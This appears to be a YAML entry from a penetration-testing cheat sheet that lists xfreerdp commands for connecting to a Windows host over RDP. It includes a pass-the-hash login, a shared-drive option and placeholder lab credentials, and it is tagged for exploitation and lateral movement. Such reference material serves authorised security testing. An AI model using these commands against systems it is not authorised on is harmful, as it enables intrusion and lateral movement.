---
description: |
  Connect to Windows via RDP from Linux using xfreerdp.

  Reference values:
    Target IP: 10.10.10.1
    Username: pentuser
    Password: P@ssw0rd123
    Domain: test.local
command: |
  # Basic RDP connection
  xfreerdp /u:pentuser /p:'P@ssw0rd123' /v:10.10.10.1

  # With domain
  xfreerdp /u:pentuser /p:'P@ssw0rd123' /d:test.local /v:10.10.10.1

  # With hash (Pass-the-Hash over RDP)
  xfreerdp /u:pentuser /pth:aad3b435b51404eeaad3b435b51404ee /v:10.10.10.1

  # Full screen with shared drive
  xfreerdp /u:pentuser /p:'P@ssw0rd123' /v:10.10.10.1 /f /drive:share,/tmp
phase:
  - Exploitation
  - Lateral_Movement
target_os:
  - Windows
services:
  - RDP
items:
  - Username
  - Password
  - Hash
techniques:
  - Pass-the-Hash_Ticket
network_position:
  - Internal
references:
  - https://github.com/FreeRDP/FreeRDP
---
